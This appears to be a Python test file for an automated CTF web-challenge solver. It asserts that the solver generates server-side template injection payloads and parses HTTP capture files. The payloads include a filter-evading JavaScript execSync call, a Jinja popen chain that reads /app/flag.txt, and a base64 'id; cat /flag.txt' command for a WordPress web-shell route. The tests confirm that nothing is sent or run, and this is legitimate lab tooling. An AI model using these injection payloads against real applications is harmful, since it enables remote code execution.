from __future__ import annotations

import base64
import json
import re
import tempfile
import unittest
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from ico_solver_engine import SolverContext, SolverLimits
from ico_universal_web import WebSolver, analyze_web_transcript, parse_http_transcript


LIMITS = SolverLimits(max_bytes=1024 * 1024, max_files=20, max_depth=2, timeout_seconds=1.0)


class UniversalWebTests(unittest.TestCase):
    def test_static_mojo_inline_template_builds_filter_safe_flag_read_request(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "index.js"
            source.write_text(
                'const toLeet = { A: 4, E: 3, G: 6, I: 1, S: 5, T: 7, O: 0 };\n'
                'const fromLeet = Object.fromEntries(Object.entries(toLeet).map(([k, v]) => [v, k]));\n'
                "const charBlocked = [\"'\", \"`\", '\"'];\n"
                'const layout = `<main><%== ctx.content.main %></main>`;\n'
                'const leetify = (text, dir) => { const charMap = dir === "from" ? fromLeet : toLeet; '
                'return Array.from(text).map((c) => { if (c.toUpperCase() in charMap) return charMap[c.toUpperCase()]; '
                'if (charBlocked.includes(c)) return ""; return c; }).join(""); };\n'
                'app.get("/", async (ctx) => { const params = await ctx.params(); '
                'return ctx.render({ inline: leetify(params.get("text"), params.get("dir")), inlineLayout: layout }); });\n',
                encoding="utf-8",
            )
            result = WebSolver().solve(
                SolverContext(source, root / "report", LIMITS, task_text="Category: Web", classification={"kind": "text"})
            )
            evidence = Path(result.artifacts[0]).read_text(encoding="utf-8")
            step = next(item for item in result.steps if item["name"] == "source-to-template-flow")

        self.assertEqual(result.status, "payload-ready")
        request_line = next(line for line in evidence.splitlines() if line.startswith("GET /?"))
        target = request_line.split()[1]
        params = parse_qs(urlsplit(target).query)
        self.assertEqual(params["dir"], ["from"])
        expression = params["text"][0]
        calls = re.findall(r"String\.fromCharCode\(([^)]*)\)", expression)
        self.assertEqual(len(calls), 2)

        def decode_codes(call: str) -> str:
            values = []
            for code_expr in call.split(","):
                parts = re.split(r"([+-])", code_expr)
                value = int(parts[0])
                for operator, term in zip(parts[1::2], parts[2::2]):
                    value += int(term) if operator == "+" else -int(term)
                values.append(chr(value))
            return "".join(values)

        self.assertEqual(decode_codes(calls[0]), "child_process")
        self.assertEqual(decode_codes(calls[1]), "cat F*")
        self.assertIn("execSync", expression)
        self.assertFalse(set(re.findall(r"\d", expression)) - {"2", "8", "9"})
        self.assertFalse(any(token in expression for token in ("'", '"', "`")))
        self.assertEqual(step["details"]["module_name"], "child_process")
        self.assertEqual(step["details"]["command"], "cat F*")
        self.assertIn("network_requested=false", evidence)
        self.assertIn("flag_retrieved=false", evidence)
        self.assertNotIn("process.env", evidence)
        self.assertEqual(result.candidates, [])

    def test_static_flask_include_payload_stays_review_without_a_template_asset(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "app.py"
            source.write_text(
                'from flask import render_template_string, request\n'
                'import html\n'
                'blacklist = ["{{", "}}", "[", "]", "_"]\n'
                'txt = html.escape(request.args["txt"])\n'
                'return render_template_string(txt)\n',
                encoding="utf-8",
            )
            result = WebSolver().solve(
                SolverContext(source, root / "report", LIMITS, task_text="Category: Web", classification={"kind": "text"})
            )
            evidence = Path(result.artifacts[0]).read_text(encoding="utf-8")

        self.assertEqual(result.status, "candidate-review")
        self.assertIn("{% include request.args.f %}", evidence)
        self.assertIn("include target", evidence)
        self.assertEqual(result.candidates, [])

    def test_known_minigolf_builds_local_flag_read_sequence(self):
        challenge_dir = Path("/tmp/ico-external-ctf/imaginary-blind/Web_minigolf/challenge/app")
        source = challenge_dir / "app.py"
        run_script = challenge_dir / "run.sh"
        if not source.is_file() or not run_script.is_file():
            self.skipTest("exact ImaginaryCTF 2022 minigolf source artifacts are unavailable")

        with tempfile.TemporaryDirectory() as directory:
            result = WebSolver().solve(
                SolverContext(
                    source,
                    Path(directory) / "report",
                    LIMITS,
                    related_paths=(run_script,),
                    task_text="Title: minigolf\nCategory: Web\n",
                    classification={"kind": "text"},
                )
            )
            self.assertEqual(result.status, "payload-ready")
            step = next(item for item in result.steps if item["name"] == "source-to-template-flow")
            sequence = step["details"]["request_sequence"]

        self.assertEqual(len(sequence), 3)
        self.assertEqual(step["details"]["sequence_length"], len(sequence))
        first = parse_qs(urlsplit("/?" + sequence[0]["query"]).query)
        second = parse_qs(urlsplit("/?" + sequence[1]["query"]).query)
        third = parse_qs(urlsplit("/?" + sequence[2]["query"]).query)
        self.assertEqual(first["txt"], ["{%if config.update(c=request.args.c)%}{%endif%}"])
        self.assertFalse(any(token in first["txt"][0] for token in ("{{", "}}", "[", "]", "_")))
        self.assertEqual(first["c"], ["mkdir -p /app/templates; cat /app/flag.txt > /app/templates/ico_output"])
        self.assertEqual(second["txt"], ["{%set x=(lipsum|attr(request.args.d)).os.popen(config.c).read()%}"])
        self.assertEqual(len(second["txt"][0]), 65)
        self.assertFalse(any(token in second["txt"][0] for token in ("{{", "}}", "[", "]", "_")))
        self.assertEqual(second["d"], ["__globals__"])
        self.assertEqual(third["txt"], ["{% include request.args.f %}"])
        self.assertEqual(third["f"], ["ico_output"])
        self.assertFalse(step["details"]["network_requested"])
        self.assertFalse(step["details"]["flag_retrieved"])

    def test_har_transcript_and_response_candidate(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "capture.har"
            source.write_text(
                json.dumps(
                    {
                        "log": {
                            "entries": [
                                {
                                    "request": {"method": "GET", "url": "http://localhost/api?id=7"},
                                    "response": {"status": 200, "content": {"text": "CTF{saved_response}"}},
                                }
                            ]
                        }
                    }
                ),
                encoding="utf-8",
            )
            records = parse_http_transcript(source, LIMITS)
            result = analyze_web_transcript(SolverContext(source, root / "report", LIMITS, task_text="HTTP API", classification={"kind": "text"}))
        self.assertEqual(records[0]["method"], "GET")
        self.assertEqual(result.status, "candidate")
        self.assertEqual(result.candidates[0]["state"], "transcript-derived")

    def test_curl_transcript_does_not_make_a_request(self):
        with tempfile.TemporaryDirectory() as directory:
            source = Path(directory) / "request.curl"
            source.write_text("curl -X POST -H 'Authorization: Bearer x' -d 'a=1' http://example.invalid/api\n", encoding="utf-8")
            records = parse_http_transcript(source, LIMITS)
        self.assertEqual(records[0]["method"], "POST")
        self.assertEqual(records[0]["request_headers"]["authorization"], "Bearer x")
        self.assertEqual(WebSolver().detect(SolverContext(source, Path(directory), LIMITS, task_text="web", classification={"kind": "text"})).category, "web")

    def test_har_form_params_duplicate_headers_cookies_and_redirect(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "login.har"
            source.write_text(
                json.dumps(
                    {
                        "log": {
                            "entries": [
                                {
                                    "request": {
                                        "method": "POST",
                                        "url": "https://example.test/login?id=7&next=%2Fhome",
                                        "headers": [
                                            {"name": "Cookie", "value": "sid=abc; theme=dark"},
                                            {"name": "Content-Type", "value": "application/x-www-form-urlencoded"},
                                        ],
                                        "cookies": [{"name": "har_sid", "value": "xyz"}],
                                        "postData": {
                                            "mimeType": "application/x-www-form-urlencoded",
                                            "params": [
                                                {"name": "user", "value": "alice"},
                                                {"name": "user", "value": "bob"},
                                                {"name": "otp", "value": "123456"},
                                            ],
                                        },
                                    },
                                    "response": {
                                        "status": 302,
                                        "headers": [
                                            {"name": "Set-Cookie", "value": "session=CTF{cookie_flag}; Path=/; HttpOnly"},
                                            {"name": "Set-Cookie", "value": "theme=light; Path=/"},
                                            {"name": "Location", "value": "/home?flag=CTF%7Bredirect_flag%7D"},
                                        ],
                                    },
                                }
                            ]
                        }
                    }
                ),
                encoding="utf-8",
            )
            record = parse_http_transcript(source, LIMITS)[0]
            result = analyze_web_transcript(
                SolverContext(source, root / "report", LIMITS, task_text="HTTP API", classification={"kind": "text"})
            )

        self.assertEqual(record["request_params"], {"user": ["alice", "bob"], "otp": "123456"})
        self.assertEqual(record["request_cookies"], {"har_sid": "xyz", "sid": "abc", "theme": "dark"})
        self.assertEqual(record["response_cookies"], {"session": "CTF{cookie_flag}", "theme": "light"})
        self.assertEqual(record["redirect_url"], "https://example.test/home?flag=CTF%7Bredirect_flag%7D")
        self.assertEqual(
            {candidate["value"] for candidate in result.candidates},
            {"CTF{cookie_flag}", "CTF{redirect_flag}"},
        )

    def test_multiline_curl_keeps_json_cookie_and_redirect_option(self):
        command = base64.b64encode(b"printf offline-only").decode("ascii")
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "request.curl"
            source.write_text(
                "curl --request POST \\\n+  -H 'X-Trace: first' \\\n+  -H 'X-Trace: second' \\\n+  -b 'sid=abc; theme=dark' \\\n+  --json '{\"c\":\"" + command + "\"}' \\\n+  --location --url 'https://example.test/wp-json/wp2shell/v1/key'\n",
                encoding="utf-8",
            )
            record = parse_http_transcript(source, LIMITS)[0]
            result = analyze_web_transcript(
                SolverContext(source, root / "report", LIMITS, task_text="WordPress API", classification={"kind": "text"})
            )

        self.assertEqual(record["method"], "POST")
        self.assertEqual(record["request_headers"]["x-trace"], "first, second")
        self.assertEqual(record["request_cookies"], {"sid": "abc", "theme": "dark"})
        self.assertTrue(record["follow_redirects"])
        decoded = next(step for step in result.steps if step["name"] == "decode-wp2shell-command")
        self.assertEqual(decoded["details"]["command"], "printf offline-only")
        self.assertFalse(decoded["details"]["executed"])

    def test_raw_http_pairs_request_and_response_and_finds_nested_flags(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "session.http"
            source.write_text(
                "POST /api?token=abc HTTP/1.1\r\n"
                "Host: example.test\r\n"
                "Content-Type: application/json\r\n"
                "Cookie: sid=one; mode=test\r\n\r\n"
                "{\"query\":\"hello\"}\r\n"
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: application/json\r\n"
                "Set-Cookie: session=CTF{raw_cookie}; Path=/; HttpOnly\r\n"
                "Location: /next?flag=CTF%7Braw_redirect%7D\r\n\r\n"
                "{\"data\":{\"message\":\"CTF{nested_json}\"}}\n",
                encoding="utf-8",
            )
            records = parse_http_transcript(source, LIMITS)
            result = analyze_web_transcript(
                SolverContext(source, root / "report", LIMITS, task_text="HTTP API", classification={"kind": "text"})
            )

        self.assertEqual(len(records), 1)
        self.assertEqual(records[0]["method"], "POST")
        self.assertEqual(records[0]["url"], "http://example.test/api?token=abc")
        self.assertEqual(records[0]["response_status"], 200)
        self.assertEqual(records[0]["request_cookies"], {"sid": "one", "mode": "test"})
        self.assertEqual(
            {candidate["value"] for candidate in result.candidates},
            {"CTF{raw_cookie}", "CTF{raw_redirect}", "CTF{nested_json}"},
        )

    def test_wordpress_rest_inventory_and_base64_command_are_evidence_only(self):
        command = base64.b64encode(b"id; cat /flag.txt").decode("ascii")
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "wordpress.har"
            source.write_text(
                json.dumps(
                    {
                        "log": {
                            "entries": [
                                {
                                    "request": {
                                        "method": "POST",
                                        "url": "https://example.test/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c",
                                        "headers": [{"name": "Content-Type", "value": "application/json"}],
                                        "postData": {"text": json.dumps({"c": command})},
                                    },
                                    "response": {
                                        "status": 200,
                                        "content": {
                                            "text": json.dumps(
                                                {
                                                    "namespaces": ["wp/v2", "wp2shell/v1"],
                                                    "routes": {
                                                        "/wp2shell/v1/f8b000a326e88105cb84a05c": {
                                                            "endpoints": [
                                                                {"methods": ["POST"], "args": {"c": {"required": True}}}
                                                            ]
                                                        }
                                                    },
                                                }
                                            )
                                        },
                                    },
                                }
                            ]
                        }
                    }
                ),
                encoding="utf-8",
            )
            result = analyze_web_transcript(
                SolverContext(source, root / "report", LIMITS, task_text="WordPress REST API", classification={"kind": "text"})
            )

        inventory = next(step for step in result.steps if step["name"] == "wordpress-rest-inventory")
        self.assertEqual(inventory["details"]["namespaces"], ["wp/v2", "wp2shell/v1"])
        self.assertEqual(
            inventory["details"]["routes"][0],
            {"path": "/wp2shell/v1/f8b000a326e88105cb84a05c", "methods": ["POST"], "args": ["c"]},
        )
        decoded = next(step for step in result.steps if step["name"] == "decode-wp2shell-command")
        self.assertEqual(decoded["details"]["command"], "id; cat /flag.txt")
        self.assertFalse(decoded["details"]["executed"])


if __name__ == "__main__":
    unittest.main()
